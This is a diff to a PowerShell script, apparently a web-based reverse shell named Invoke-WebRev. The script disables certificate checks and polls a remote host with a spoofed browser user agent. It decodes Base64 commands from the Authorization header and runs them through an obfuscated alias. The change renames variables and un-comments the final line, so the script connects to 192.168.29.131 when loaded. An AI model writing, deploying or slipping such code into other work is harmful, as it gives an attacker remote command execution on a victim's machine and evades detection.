@@ -41,11 +41,11 @@ function Invoke-WebRev{
             [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
             $req = Invoke-WebRequest $url -Method POST -Body $postParams -UseDefaultCredentials -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
             $header = $req.Headers["Authorization"];
-            $d = [System.Convert]::FromBase64String($header);
-            $Ds = [System.Text.Encoding]::UTF8.GetString($d);
+            $c = [System.Convert]::FromBase64String($header);
+            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
             $result = "";
 
-            Foreach ($string in taleska-ei-vrixeka $Ds)
+            Foreach ($string in taleska-ei-vrixeka $cstr)
             {
                 $result += '_n1w_' + $string;
             };
@@ -55,4 +55,4 @@ function Invoke-WebRev{
     };
 }
 
-#Invoke-WebRev -ip 192.168.29.131 -port 443 -ssl
+Invoke-WebRev -ip 192.168.29.131 -port 80
